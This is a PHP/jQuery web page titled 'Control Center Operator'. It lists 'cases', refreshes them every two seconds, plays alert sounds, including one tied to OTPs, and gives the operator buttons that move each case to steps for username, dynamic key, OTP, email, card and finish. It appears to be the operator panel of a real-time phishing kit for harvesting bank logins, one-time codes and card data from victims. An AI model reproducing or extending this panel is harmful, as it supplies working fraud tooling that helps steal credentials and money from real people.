<?php 
session_start(); 
require('../lib/funciones.php');

date_default_timezone_set('America/Bogota');

if (isset($_SESSION["usuario"])) {
	
}else{	
	header("Location: ../");
}

?>
<head>
	<meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <link rel="icon" type="image/png" href="../monitor.png">
	<title>Control Center Operator</title>
	<link href="../css/style.css" rel="stylesheet">	
	<script type="text/javascript" src="../js/functions.js"></script>	
	<script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>	
	<style type="text/css">
		@media (max-width: 920px) {
		  
		}		
	</style>
</head>
<body style="text-align: right; ">
	
	<audio class="timbre timbre-normal">
	 <source src="../audio/timbre.mp3" type="audio/mpeg">
	Your browser does not support the audio element.
	</audio>

	<audio class="timbre timbre-otp">
	 <source src="../audio/electrico.mp3" type="audio/mpeg">
	Your browser does not support the audio element.
	</audio>

	<span style="color: #fff;">Usuario:</span> <span style="color: #FFFF4D"><b><?php echo $_SESSION["usuario"]; ?></b></span> - <span id="cerrar" style="color:#FF0000; cursor: pointer;">Cerrar Sesión</span>
	<div class="contenido">
			<?php
				cargar_casos();											
			?>		
	</div>	
</body>
<script type="text/javascript">
$(document).ready(function() {
  $("#cerrar").click(function(evento) {
    $.post("../cerar-sesion.php", { usr: $("#txtUsuario").val(), pass: $("#txtPass").val() }, function(data) {
      if (data === "OK") {
        window.location.href = "../";
      }
    });
  });

  setInterval(actualizar_casos, 2000);

  $(document).on('click', '.usuario, .dinamica, .otp, .correo, .tarjeta, .finalizar', function() {
    var $this = $(this);
    $this.attr('disabled', 'disabled');
    $.post("../process/estado.php", { id: $this.attr('id'), est: obtenerEstado($this) }, function(data) {
      // Manejar la respuesta si es necesario
    });
  });

  function obtenerEstado(elemento) {
    var estado = "";
    if (elemento.hasClass('usuario')) {
      estado = "12";
    } else if (elemento.hasClass('dinamica')) {
      estado = "2";
    } else if (elemento.hasClass('otp')) {
      estado = "8";
    } else if (elemento.hasClass('correo')) {
      estado = "4";
    } else if (elemento.hasClass('tarjeta')) {
      estado = "6";
    } else if (elemento.hasClass('finalizar')) {
      estado = "10";
    }
    return estado;
  }
});

</script>